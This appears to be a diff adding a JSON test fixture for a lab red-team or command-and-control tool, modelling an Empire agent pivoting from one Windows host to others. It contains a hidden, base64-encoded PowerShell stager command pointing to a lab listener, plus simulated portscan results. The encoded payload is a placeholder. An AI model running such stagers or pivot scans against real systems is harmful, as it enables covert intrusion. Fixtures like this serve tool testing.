@@ -1,0 +1,23 @@
+{
+  "name": "multi-host-pivot",
+  "target": "10.10.10.30",
+  "platform": "windows",
+  "agent_id": "WIN30PIVOT",
+  "agent_user": "CORP\\pivot",
+  "listener": "lab-http-powershell",
+  "extra_targets": ["10.10.10.31", "10.10.10.32"],
+  "stager_response": {
+    "id": 303,
+    "name": "stager-ps1-it-pivot",
+    "template": "multi_launcher",
+    "options": {
+      "Listener": "lab-http",
+      "Language": "powershell",
+      "Host": "10.10.14.5",
+      "Port": "8080",
+      "OutFile": ""
+    },
+    "output": "powershell -nop -w hidden -enc UGl2b3RTdGFnZXJQYXlsb2Fk"
+  },
+  "portscan_output": "[*] Empire portscan starting from ${CANARY}\n[+] 10.10.10.31:22 - Open\n[+] 10.10.10.31:445 - Open\n[+] 10.10.10.32:80 - Open\n[+] 10.10.10.32:3389 - Open\n[+] 10.10.10.40:445 - Open\n[*] Portscan complete\n"
+}
